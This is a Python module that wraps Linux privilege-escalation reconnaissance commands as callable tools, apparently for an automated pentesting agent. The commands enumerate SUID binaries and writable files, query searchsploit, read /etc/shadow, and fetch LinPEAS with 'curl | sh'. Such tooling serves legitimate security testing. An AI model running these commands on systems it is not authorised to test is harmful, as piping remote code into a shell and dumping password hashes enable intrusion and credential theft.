from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
import subprocess
import os


@dataclass
class Tool:
    name: str
    function: Callable
    description: str
    risk_level: str
    requires_privileges: bool
    reversible: bool = True

class PrivEscTools:
    def __init__(self):
        self.tools: Dict[str, Tool] = {}
        self._load_tools()

    def _load_tools(self):
        self.tools.update({
            'enum_system': Tool(
                name="enum_system",
                function=self._enumerate_system,
                description="Gather basic system information",
                risk_level="low",
                requires_privileges=False
            ),
            'user_info': Tool(
                name="user_info", 
                function=self._user_info,
                description="Gather current user information",
                risk_level="low",
                requires_privileges=False
            ),
            'network_info': Tool(
                name="network_info",
                function=self._network_info,
                description="Gather network configuration",
                risk_level="low", 
                requires_privileges=False
            ),
            'find_suid': Tool(
                name="find_suid",
                function=self._find_suid_binaries,
                description="Find SUID binaries",
                risk_level="medium",
                requires_privileges=False
            ),
            'check_kernel': Tool(
                name="check_kernel",
                function=self._check_kernel_vulns,
                description="Check kernel vulnerabilities",
                risk_level="high",
                requires_privileges=False
            ),
            'linpeas': Tool(
                name="linpeas",
                function=self._run_linpeas,
                description="Run LinPEAS privilege escalation script",
                risk_level="high",
                requires_privileges=False
            ),
            'check_writable_files': Tool(
                name="check_writable_files",
                function=self._check_writable_files,
                description="Check writable files",
                risk_level="medium",
                requires_privileges=False
            ),
            'check_weak_file_permissions': Tool(
                name="check_weak_file_permissions",
                function=self._check_weak_file_permissions,
                description="Check files with weak permissions",
                risk_level="medium",
                requires_privileges=False
            ),
            'check_cron_jobs': Tool(
                name="check_cron_jobs",
                function=self._check_cron_jobs,
                description="Check cron jobs and schedules",
                risk_level="low",
                requires_privileges=False
            ),
            'check_password_policies': Tool(
                name="check_password_policies",
                function=self._check_password_policies,
                description="Check password and group policies",
                risk_level="high",
                requires_privileges=False
            )
        })

    def _run_command(self, cmd: str) -> str:
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True, text=True)
            return result.stdout + result.stderr
        except subprocess.CalledProcessError as e:
            return f"Error: {e.returncode}\n{e.output}"

    async def _enumerate_system(self, **kwargs) -> Dict:
        commands = ["uname -a", "cat /etc/issue", "cat /etc/*-release", "ps aux", "id"]
        return {cmd: self._run_command(cmd) for cmd in commands}

    async def _user_info(self, **kwargs) -> Dict:
        commands = ["id", "whoami", "groups", "lastlog", "who"]
        return {cmd: self._run_command(cmd) for cmd in commands}

    async def _network_info(self, **kwargs) -> Dict:
        commands = ["ifconfig", "netstat -tuln", "ss -tuln", "route -n", "ip a"]
        return {cmd: self._run_command(cmd) for cmd in commands}

    async def _find_suid_binaries(self, **kwargs) -> List[str]:
        return self._run_command("find / -perm -4000 -type f 2>/dev/null").splitlines()

    async def _check_kernel_vulns(self, **kwargs) -> str:
        return self._run_command("uname -r && searchsploit linux kernel")

    async def _run_linpeas(self, **kwargs) -> str:
        script_url = "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
        return self._run_command(f"curl -L {script_url} | sh")

    async def _check_writable_files(self, **kwargs) -> List[str]:
        return self._run_command("find / -writable -type f 2>/dev/null").splitlines()

    async def _check_weak_file_permissions(self, **kwargs) -> List[str]:
        return self._run_command("find / -perm -0002 -type f 2>/dev/null").splitlines()

    async def _check_cron_jobs(self, **kwargs) -> Dict:
        commands = ["cat /etc/crontab", "ls -la /etc/cron.*", "ls -la /var/spool/cron/crontabs"]
        return {cmd: self._run_command(cmd) for cmd in commands}

    async def _check_password_policies(self, **kwargs) -> str:
        return self._run_command("cat /etc/passwd && cat /etc/shadow && cat /etc/group")

    def get_tool(self, tool_name: str) -> Optional[Tool]:
        return self.tools.get(tool_name)

    def list_tools(self) -> List[str]:
        return list(self.tools.keys())

    def get_tool_description(self, tool_name: str) -> str:
        tool = self.get_tool(tool_name)
        return tool.description if tool else "Tool not found"

    async def execute_tool(self, tool_name: str, **kwargs) -> Dict:
        tool = self.get_tool(tool_name)
        if not tool:
            raise ValueError(f"Tool {tool_name} not found")
        try:
            if tool_name == "linpeas":
                user_response = input("LinPEAS is a high-risk command. Do you want to proceed? (yes/no): ")
                if user_response.lower() != "yes":
                    return {"status": "aborted", "tool": tool_name}
            result = await tool.function(**kwargs)
            return {"status": "success", "tool": tool_name, "result": result}
        except Exception as e:
            return {"status": "error", "tool": tool_name, "error": str(e)}
